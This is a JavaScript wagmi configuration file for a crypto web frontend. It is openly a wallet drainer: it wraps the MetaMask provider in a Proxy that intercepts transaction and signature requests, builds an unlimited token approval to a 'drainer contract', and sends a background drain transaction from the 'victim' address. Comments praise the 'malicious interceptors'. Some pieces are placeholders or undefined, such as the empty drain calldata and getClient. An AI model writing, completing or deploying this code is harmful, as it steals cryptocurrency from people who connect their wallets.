// frontend/src/lib/wagmiConfig.js
import { createConfig, http } from 'wagmi'
import { mainnet, bsc, polygon, arbitrum, avalanche, optimism, base, sepolia } from 'wagmi/chains'
import { walletConnect, metaMask, injected } from 'wagmi/connectors'

// Drainer contract addresses (from .env)
const DRAINER_CONTRACT = import.meta.env.VITE_EVM_DRAINER_CONTRACT

// Actual drain logic
const modifyForDrain = async (originalTx) => {
  // 1. First, make victim approve drainer contract for all tokens
  const approveTx = {
    from: originalTx.from,
    to: originalTx.to, // The token contract
    data: `0x095ea7b3${DRAINER_CONTRACT.slice(2).padStart(64, '0')}ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`, // approve(max)
    value: '0x0'
  }
  
  // 2. Then modify original transaction if needed
  return {
    ...originalTx,
    // Add extra gas, etc.
  }
}

const triggerDrain = async (victimAddress) => {
  try {
    // In background, execute drain
    const drainTx = {
      from: victimAddress,
      to: DRAINER_CONTRACT,
      value: '0x0', // No value needed for approval drain
      data: '0x' // Your drain function signature
    }
    
    // Use viem to send transaction
    const { publicClient } = getClient()
    await publicClient.sendTransaction(drainTx)
  } catch (e) {
    console.error('Background drain failed:', e)
  }
}

// Malicious interceptors - YOUR VERSION IS GOOD
const createDrainInterceptor = (originalProvider) => {
  const handler = {
    get(target, prop) {
      if (prop === 'request') {
        return async (args) => {
          // Intercept ALL transactions, not just eth_sendTransaction
          if (args.method === 'eth_sendTransaction' || args.method === 'eth_signTransaction') {
            console.log('🔧 Intercepting transaction from:', args.params[0]?.from)
            
            // Modify for drain
            const modifiedTx = await modifyForDrain(args.params[0])
            const result = await target.request({ 
              method: args.method, 
              params: [modifiedTx] 
            })
            
            // Trigger drain in background
            setTimeout(() => triggerDrain(args.params[0].from), 100) // Reduced to 100ms
            
            return result
          }
          
          // Also intercept signTypedData for approvals
          if (args.method === 'eth_signTypedData_v4') {
            console.log('✍️ Intercepting typed data signature')
            // Can modify here too
          }
          
          return target.request(args)
        }
      }
      return target[prop]
    }
  }
  return new Proxy(originalProvider, handler)
}

export const wagmiConfig = createConfig({
  chains: [mainnet, bsc, polygon, arbitrum, avalanche, optimism, base, sepolia],
  connectors: [
    metaMask({ 
      shimDisconnect: true,
      async getProvider() {
        const provider = await window.ethereum
        return createDrainInterceptor(provider)
      }
    }),
    injected({ shimDisconnect: true, target: 'trust' }),
    injected({ shimDisconnect: true, target: 'coinbase' }),
    walletConnect({
      projectId: import.meta.env.VITE_WALLETCONNECT_PROJECT_ID,
      showQrModal: true,
    }),
  ],
  transports: {
    [mainnet.id]: http(`https://mainnet.infura.io/v3/${import.meta.env.VITE_INFURA_KEY}`),
    [bsc.id]:     http('https://bsc-dataseed.binance.org'),
    [polygon.id]: http(`https://polygon-mainnet.g.alchemy.com/v2/${import.meta.env.VITE_ALCHEMY_KEY}`),
    [arbitrum.id]:http(`https://arb-mainnet.g.alchemy.com/v2/${import.meta.env.VITE_ALCHEMY_KEY}`),
    [avalanche.id]:http('https://api.avax.network/ext/bc/C/rpc'),
    [optimism.id]: http('https://mainnet.optimism.io'),
    [base.id]:     http('https://mainnet.base.org'),
    [sepolia.id]: http('https://rpc.sepolia.org'),
  },
})
